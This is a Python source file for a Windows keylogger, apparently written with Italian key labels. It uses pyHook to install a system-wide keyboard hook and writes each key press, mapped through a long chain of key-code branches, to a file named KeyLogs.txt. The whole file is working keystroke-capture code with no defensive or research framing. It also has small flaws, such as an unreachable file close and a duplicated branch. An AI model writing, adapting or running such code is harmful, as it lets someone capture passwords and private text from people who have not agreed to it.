import pyHook,pythoncom,sys,os


def KeyPressed(event):

        f = open(r"KeyLogs.txt","a")

        if event.KeyID==8:
                a="<BackSpace>\n"
                print(a)
                f.write(a)

        elif event.KeyID == 160 or event.KeyID==161:
                a = "<Shift>\n"
                print(a)
                f.write(a)

        elif event.KeyID == 162 or event.KeyID==163:
                a = "<Ctrl>\n"
                print(a)
                f.write(a)

        elif event.KeyID == 13:
                a = "<Enter>\n"
                print(a)
                f.write(a)

        elif event.KeyID == 20:
            a = "<Maiuscolo>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 32:
            a = "<Spazio>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 9:
            a = "<Tab>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 46:
            a = "<Canc>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 164:
            a = "<Alt>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 165:
            a = "<AltGR>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 49:
            a = "1\n"
            print(a)
            f.write(a)

        elif event.KeyID == 50:
            a = "2\n"
            print(a)
            f.write(a)

        elif event.KeyID == 51:
            a = "3\n"
            print(a)
            f.write(a)

        elif event.KeyID == 52:
            a = "4\n"
            print(a)
            f.write(a)

        elif event.KeyID == 53:
            a = "5\n"
            print(a)
            f.write(a)

        elif event.KeyID == 54:
            a = "6\n"
            print(a)
            f.write(a)

        elif event.KeyID == 55:
            a = "7\n"
            print(a)
            f.write(a)

        elif event.KeyID == 56:
            a = "8\n"
            print(a)
            f.write(a)

        elif event.KeyID == 57:
            a = "9\n"
            print(a)
            f.write(a)

        elif event.KeyID == 48:
            a = "0\n"
            print(a)
            f.write(a)

        elif event.KeyID == 219:
            a = "'\n"
            print(a)
            f.write(a)

        elif event.KeyID == 220:
            a = "\\\n"
            print(a)
            f.write(a)

        elif event.KeyID == 111:
            a = "/\n"
            print(a)
            f.write(a)

        elif event.KeyID == 221:
            a = "ì\n"
            print(a)
            f.write(a)

        elif event.KeyID == 189:
            a = "-\n"
            print(a)
            f.write(a)

        elif event.KeyID == 190:
            a = ".\n"
            print(a)
            f.write(a)

        elif event.KeyID == 188:
            a = ",\n"
            print(a)
            f.write(a)

        elif event.KeyID == 226:
            a = "<\n"
            print(a)
            f.write(a)

        elif event.KeyID == 186:
            a = "è\n"
            print(a)
            f.write(a)

        elif event.KeyID == 187:
            a = "+\n"
            print(a)
            f.write(a)

        elif event.KeyID == 192:
            a = "ò\n"
            print(a)
            f.write(a)

        elif event.KeyID == 222:
            a = "à\n"
            print(a)
            f.write(a)

        elif event.KeyID == 191:
            a = "ù\n"
            print(a)
            f.write(a)

        elif event.KeyID == 65:
            a = "a\n"
            print(a)
            f.write(a)

        elif event.KeyID == 66:
            a = "b\n"
            print(a)
            f.write(a)

        elif event.KeyID == 67:
            a = "c\n"
            print(a)
            f.write(a)

        elif event.KeyID == 68:
            a = "d\n"
            print(a)
            f.write(a)

        elif event.KeyID == 69:
            a = "e\n"
            print(a)
            f.write(a)

        elif event.KeyID == 70:
            a = "f\n"
            print(a)
            f.write(a)

        elif event.KeyID == 71:
            a = "g\n"
            print(a)
            f.write(a)

        elif event.KeyID == 72:
            a = "h\n"
            print(a)
            f.write(a)

        elif event.KeyID == 73:
            a = "i\n"
            print(a)
            f.write(a)

        elif event.KeyID == 74:
            a = "j\n"
            print(a)
            f.write(a)

        elif event.KeyID == 75:
            a = "k\n"
            print(a)
            f.write(a)

        elif event.KeyID == 76:
            a = "l\n"
            print(a)
            f.write(a)

        elif event.KeyID == 77:
            a = "m\n"
            print(a)
            f.write(a)

        elif event.KeyID == 78:
            a = "n\n"
            print(a)
            f.write(a)

        elif event.KeyID == 79:
            a = "o\n"
            print(a)
            f.write(a)

        elif event.KeyID == 80:
            a = "p\n"
            print(a)
            f.write(a)

        elif event.KeyID == 81:
            a = "q\n"
            print(a)
            f.write(a)

        elif event.KeyID == 82:
            a = "r\n"
            print(a)
            f.write(a)

        elif event.KeyID == 83:
            a = "s\n"
            print(a)
            f.write(a)

        elif event.KeyID == 84:
            a = "t\n"
            print(a)
            f.write(a)

        elif event.KeyID == 85:
            a = "u\n"
            print(a)
            f.write(a)

        elif event.KeyID == 86:
            a = "v\n"
            print(a)
            f.write(a)

        elif event.KeyID == 87:
            a = "w\n"
            print(a)
            f.write(a)

        elif event.KeyID == 88:
            a = "x\n"
            print(a)
            f.write(a)

        elif event.KeyID == 89:
            a = "y\n"
            print(a)
            f.write(a)

        elif event.KeyID == 90:
            a = "z\n"
            print(a)
            f.write(a)

        elif event.KeyID == 84:
            a = "t\n"
            print(a)
            f.write(a)

        elif event.KeyID == 106:
            a = "*\n"
            print(a)
            f.write(a)

        elif event.KeyID == 91 or event.KeyID== 92:
            a = "<Win>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 93:
            a = "<Apps>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 37:
            a = "<Left>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 38:
            a = "<Up>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 39:
            a = "<Right>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 40:
            a = "<Down>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 96:
            a = "0\n"
            print(a)
            f.write(a)

        elif event.KeyID == 97:
            a = "1\n"
            print(a)
            f.write(a)

        elif event.KeyID == 98:
            a = "2\n"
            print(a)
            f.write(a)

        elif event.KeyID == 99:
            a = "3\n"
            print(a)
            f.write(a)

        elif event.KeyID == 100:
            a = "4\n"
            print(a)
            f.write(a)

        elif event.KeyID == 101:
            a = "5\n"
            print(a)
            f.write(a)

        elif event.KeyID == 102:
            a = "6\n"
            print(a)
            f.write(a)

        elif event.KeyID == 103:
            a = "7\n"
            print(a)
            f.write(a)

        elif event.KeyID == 104:
            a = "8\n"
            print(a)
            f.write(a)

        elif event.KeyID == 105:
            a = "9\n"
            print(a)
            f.write(a)

        elif event.KeyID == 33:
            a = "<PagUp>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 34:
            a = "<PagDown>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 45:
            a = "<Insert>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 144:
            a = "<BlockNum>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 109:
            a = "-\n"
            print(a)
            f.write(a)

        elif event.KeyID == 107:
            a = "+\n"
            print(a)
            f.write(a)

        elif event.KeyID == 27:
            a = "<Esc>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 112:
            a = "<F1>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 113:
            a = "<F2>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 114:
            a = "<F3>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 115:
            a = "<F4>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 116:
            a = "<F5>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 117:
            a = "<F6>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 118:
            a = "<F7>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 119:
            a = "<F8>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 120:
            a = "<F9>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 121:
            a = "<F10>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 122:
            a = "<F11>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 123:
            a = "<F12>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 44:
            a = "<Stamp>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 36:
            a = "<Start>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 35:
            a = "<Finish>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 145:
            a = "<BlocScorr>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 19:
            a = "<PausaInterr>\n"
            print(a)
            f.write(a)

        elif event.KeyID == 110:
            a = ".\n"
            print(a)
            f.write(a)

        else:
                print('Ascii:', str(event.Ascii), chr(event.Ascii))
                print('KeyID:', event.KeyID)
                print('Key:', event.Key)
                print("Scan: ", event.ScanCode)
                print("")
        return True


        f.close()

manager= pyHook.HookManager()
manager.KeyDown=KeyPressed
manager.HookKeyboard()

pythoncom.PumpMessages()
